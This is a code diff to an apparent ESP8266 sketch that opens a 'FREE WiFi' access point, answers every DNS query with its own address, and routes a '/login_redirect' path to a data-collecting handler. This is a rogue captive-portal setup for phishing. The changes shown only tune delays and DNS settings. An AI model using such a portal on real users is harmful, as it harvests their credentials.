@@ -21,7 +21,9 @@ char ssid[] = "FREE WiFi";
 String data;
 
 bool handleFile(String path) {
-  if(path.endsWith("/")) path += "index";
+  if(path.endsWith("/")) 
+    path += "index";
+  
   if(SPIFFS.exists(path)) {
     File file = SPIFFS.open(path, "r");
     server.streamFile(file, "text/html");
@@ -73,25 +75,28 @@ void getData() {
 }
 
 void setup() {
+  delay(1000);
   SPIFFS.begin();
   
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIP, apIP, netMsk);
   WiFi.softAP(ssid);
+  
+  delay(1000);
 
-  dnsServer.setTTL(1000);
-  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
+  dnsServer.setTTL(300);
+  dnsServer.setErrorReplyCode(DNSReplyCode::ServerFailure);
   dnsServer.start(DNS_PORT, "*", apIP);
 
-  if(MDNS.begin("captive.portal")) {
+  if(MDNS.begin("captive.portal"))
     MDNS.addService("http", "tcp", 80);
-  }
+  
+  delay(1000);
   
   server.onNotFound([]() {
     if (!handleFile(server.uri()))
       handleFile("/");
   });
-
   server.on("/login_redirect", getData);
   server.on("/reset", resetData);
   server.on("/ssid", changeSSID);
